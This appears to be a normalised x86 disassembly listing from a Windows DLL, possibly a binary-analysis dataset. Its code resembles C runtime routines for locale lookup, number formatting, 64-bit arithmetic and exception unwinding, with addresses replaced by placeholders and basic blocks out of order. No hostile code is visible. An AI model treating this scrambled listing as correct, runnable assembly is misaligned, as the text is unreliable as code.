lea eax [ esi + 0xec ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0xd4 ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0xf0 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0xf4 ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ esi + 0xf8 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0xfc ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x100 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x104 ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ esi + 0x108 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x10c ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x110 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x114 ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ esi + 0x118 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x11c ]
push eax
push 0x4f
push ebx
push 0x2
lea eax [ ebp - 0xc ]
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x120 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x124 ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ esi + 0x128 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x12c ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x130 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x134 ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ esi + 0x138 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x13c ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x140 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x144 ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ esi + 0x148 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x14c ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x150 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x154 ]
push eax
push 0x29
push ebx
push 0x2
pop ebx
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_1000932c
add esp 0x50
or edi eax
lea eax [ esi + 0x158 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_1000932c
or edi eax
lea eax [ esi + 0x15c ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_1000932c
add esi 0x160
push esi
push 0x1003
push [ ebp - 0x4 ]
or edi eax
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_1000932c
add esp 0x3c
or eax edi
pop edi
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_10082c93
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_1007fa90
inc eax
push eax
push esi
add esi edi
push esi
call sub_1007ec90
add esp 0x10
sub_10082cb2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_1001da0a
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp + 0x8 ] ecx
jbe r-xdata
call sub_1006299d
push 0x16
cmp [ ebp + 0xc ] ecx
jle r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
push edi
cmp [ ebp + 0x18 ] cl
je r-xdata
call sub_1006299d
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] ecx
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_10082c93
pop esi
mov [ eax ] esi
call sub_100427ff
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
mov cl [ esi + 0x1 ]
mov eax [ ebp - 0x10 ]
mov [ esi ] cl
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
inc esi
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1003cbb0
int3
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] eax
je r-xdata
push r--data
push ebx
push esi
call sub_10057f0f
add esp 0xc
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
pop edi
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi + 0x1 ] 0x2d
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_1007ec90
add esp 0xc
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi + 0x2 ] al
mov eax edx
pop esi
pop ebx
leave
retn
add [ esi + 0x4 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi + 0x3 ] al
mov eax edx
sub_10082e13
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov edi eax
mov esi [ edi + 0x4 ]
mov ebx ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_1001da0a
test ebx ebx
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_1006299d
push 0x16
pop esi
mov [ eax ] esi
call sub_100427ff
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi + 0x4 ]
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ edi ] 0x2d
sete al
add eax esi
mov [ eax + ebx ] 0x30
add esi eax
push esi
lea ebx [ esi + 0x1 ]
call sub_1007fa90
inc eax
push eax
push esi
push ebx
call sub_1007ec90
mov [ esi ] 0x30
add esp 0x10
mov esi ebx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push esi
lea ebx [ esi + 0x1 ]
call sub_1007fa90
inc eax
push eax
push esi
push ebx
call sub_1007ec90
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov edi [ edi + 0x4 ]
add esp 0x10
test edi edi
jns r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg edi
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp + 0xc ] edi
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax ebx
call sub_10082c93
push edi
push 0x30
push ebx
call sub_1007f940
add esp 0xc
sub_10082f16
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
push ebx
push esi
push edi
mov edi [ GetLocaleInfoW@IAT ]
xor esi esi
push esi
push esi
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
push [ ebp + 0xc ]
call edi
mov ecx eax
mov [ ebp - 0xc ] ecx
cmp ecx esi
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
xor ebx ebx
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
leave
retn
push [ ebp - 0xc ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call edi
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_10007442
pop ecx
mov eax esi
push esi
push esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
push eax
call sub_1000b33e
pop ecx
cmp eax esi
je r-xdata
call sub_10082ff0
mov ebx esp
cmp ebx esi
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push esi
jmp r-xdata
mov ebx eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ ebx ] 0xcccc
add ebx 0x8
jmp r-xdata
push 0xffffffff
push ebx
push esi
push [ ebp - 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp ebx esi
je r-xdata
sub_1008301c
mov edi edi
push ebp
mov ebp esp
xor eax eax
push ebx
xor ebx ebx
inc eax
cmp [ ebp + 0xc ] ebx
jl r-xdata
xor ecx ecx
test eax eax
sete cl
pop ebx
mov eax ecx
pop ebp
retn
push esi
push edi
pop edi
pop esi
mov eax [ ebp + 0xc ]
add eax ebx
cdq
sub eax edx
mov esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
lea edi [ eax + esi * 8 ]
push [ edi ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_100385c3
pop ecx
pop ecx
test eax eax
jne r-xdata
jns r-xdata
mov ecx [ ebp + 0x10 ]
add edi 0x4
mov [ ecx ] edi
jmp r-xdata
lea ebx [ esi + 0x1 ]
dec esi
mov [ ebp + 0xc ] esi
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jle r-xdata
test eax eax
je r-xdata
sub_1008307e
mov edi edi
push ebp
mov ebp esp
push ecx
test esi esi
je r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x20001004
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
leave
retn
push r--data
push esi
call sub_1007fc10
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
call [ GetACP@IAT ]
leave
retn
push r--data
push esi
call sub_1007fc10
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_1002c5fc
pop ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x2000000b
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
sub_10083102
mov edi edi
push ebp
mov ebp esp
xor eax eax
xor eax eax
pop ebp
retn
add eax 0x2
cmp eax 0x14
jb r-xdata
mov cx [ ebp + 0x8 ]
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_10083127
mov edi edi
push esi
xor esi esi
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
lea eax [ ecx - 0x61 ]
inc edx
cmp al 0x5
ja r-xdata
mov eax esi
pop esi
retn
lea eax [ ecx - 0x41 ]
cmp al 0x5
ja r-xdata
add cl 0xd9
jmp r-xdata
movsx eax cl
add esi esi
lea esi [ eax + esi * 8 - 0x30 ]
add cl 0xf9
sub_10083158
xor eax eax
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
retn
inc eax
jmp r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x41
jl r-xdata
sub_10083173
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_10044649
mov edx edi
mov esi eax
call sub_10083127
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0xb0 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0xa0 ]
call sub_100385c3
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0xa4 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0xa4 ]
shr eax 0x2
not eax
and eax 0x1
push edi
call sub_10083102
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10001e8b
leave
retn 0x4
or [ esi + 0xa4 ] 0x4
mov [ esi + 0xb8 ] edi
mov [ esi + 0xb4 ] edi
sub_1008321a
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax esi
and eax 0x3ff
push 0x20000001
or eax 0x400
push eax
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop esi
leave
retn
mov eax [ ebp + 0xc ]
mov esi [ eax ]
push edi
mov edx esi
call sub_10083158
push esi
mov edi eax
call sub_1007fa90
pop ecx
cmp edi eax
pop edi
je r-xdata
sub_10083275
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_10044649
mov edx edi
lea esi [ eax + 0x9c ]
call sub_10083127
mov ebx [ GetLocaleInfoA@IAT ]
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_100385c3
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov eax 0x300
and ecx eax
cmp ecx eax
je r-xdata
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_100385c3
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_100385c3
pop ecx
xor ebx ebx
pop ecx
test eax eax
jne r-xdata
test [ esi + 0x8 ] 0x2
jne r-xdata
or [ esi + 0x8 ] 0x304
mov [ esi + 0x18 ] edi
jmp r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
or [ esi + 0x8 ] 0x200
mov eax [ esi + 0x8 ]
cmp [ esi + 0x10 ] ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0x1c ] edi
cmp [ esi + 0xc ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
or eax 0x100
mov [ esi + 0x8 ] eax
jmp r-xdata
mov edx [ esi + 0x8 ]
test dl 0x1
jne r-xdata
push eax
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_1003159d
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_100385c3
pop ecx
pop ecx
test eax eax
jne r-xdata
or [ esi + 0x8 ] 0x100
push [ esi ]
call sub_1007fa90
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
push edi
call sub_10083102
pop ecx
test eax eax
je r-xdata
push [ esi ]
or [ esi + 0x8 ] 0x2
mov [ esi + 0x1c ] edi
call sub_1007fa90
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
push esi
push ebx
mov [ esi + 0x18 ] edi
push esi
push 0x1
jmp r-xdata
or edx 0x1
mov [ esi + 0x8 ] edx
mov [ esi + 0x18 ] edi
jmp r-xdata
mov eax edi
call sub_1008321a
pop ecx
pop ecx
test eax eax
je r-xdata
sub_10083446
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_10044649
mov edx edi
lea esi [ eax + 0x9c ]
call sub_10083127
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_100385c3
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10001e8b
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ esi + 0xc ] 0x0
je r-xdata
or [ esi + 0x8 ] 0x4
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
push esi
push 0x1
jmp r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_100385c3
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax edi
call sub_1008321a
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
push eax
sub_10083506
push [ esi ]
call sub_1007fa90
push [ esi + 0x4 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_1007fa90
sub eax 0x3
neg eax
sbb eax eax
and [ esi + 0x18 ] 0x0
inc eax
cmp [ esi + 0x10 ] 0x0
pop ecx
pop ecx
mov [ esi + 0x14 ] eax
je r-xdata
mov edx [ esi ]
call sub_10083158
push 0x2
pop eax
jmp r-xdata
and [ esi + 0x8 ] 0x0
test eax 0x200
je r-xdata
push 0x1
push sub_10083275
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
mov eax [ esi + 0x8 ]
test eax 0x100
je r-xdata
test al 0x7
jne r-xdata
retn
sub_1008356d
push [ esi ]
call sub_1007fa90
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0x10 ] eax
je r-xdata
mov edx [ esi ]
call sub_10083158
push 0x2
pop eax
jmp r-xdata
retn
and [ esi + 0x8 ] 0x0
push 0x1
push sub_10083446
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
sub_100835b0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_100835f0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1001da0a
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_10083650
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10083670
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_10001e8b
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_100836b5
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_100836b5
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_10083670
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10083765
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10083784
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_1008375c
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_10083765
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_10083787
push 0x14
push r--data
call sub_1007fb20
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_10058c10
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10083858
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_1007fb65
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_10068b4b
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_10083829
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_1004b913
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_1004b913
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_10083870
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_100838a0
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_10083980
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_1008399f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
cmp [ ebp + 0x8 ] ebx
ja r-xdata
call sub_1006299d
push 0x16
pop esi
mov [ eax ] esi
call sub_100427ff
mov eax esi
jmp r-xdata
xor ecx ecx
